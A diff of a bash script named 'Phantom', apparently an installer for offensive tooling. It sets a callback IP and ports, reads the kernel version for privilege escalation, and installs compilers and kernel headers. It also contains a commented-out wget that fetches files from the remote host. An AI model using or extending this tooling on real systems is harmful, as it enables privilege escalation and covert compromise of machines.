@@ -2,8 +2,8 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15402"
-portr="15119"
+portp="15823"
+portr="15606"
 portk="1234"
 
 echo "---Phantom started---"
@@ -30,7 +30,8 @@ echo "linux distribution: $distro"
 
 #find the kernel version (needed for priv esc)
 version=$(uname -r)
-version=${version%%-*}
+#version=${version%%-*}
+version=${version%%-generic}
 major=${version%%\.*}
 minor=${version#*\.}
 minor=${minor%\.*}
@@ -145,7 +146,7 @@ fi
 
 #install prerequisite programs
 echo "--install prerequisite programs--"
-programs=(make gcc wget yes unzip patch kmod)
+programs=(make gcc unzip patch kmod linux-headers-$version linux-headers-$(uname -r))
 for ((i=0; i < ${#programs[@]}; i++)); do
   install_program ${programs[$i]}
   if [ "$?" == "0" ]; then
@@ -182,7 +183,6 @@ else
 
   #debian
   elif [ "$distro" == "debian" ]; then
-    install_program linux-headers-$(uname -r)
 
     #ln -s -f -T /usr/src/linux-headers-4.18.0-kali2-common /lib/modules/$(uname -r)/build
     #wget -q -P /tmp -r http://$ip:$portp/include/
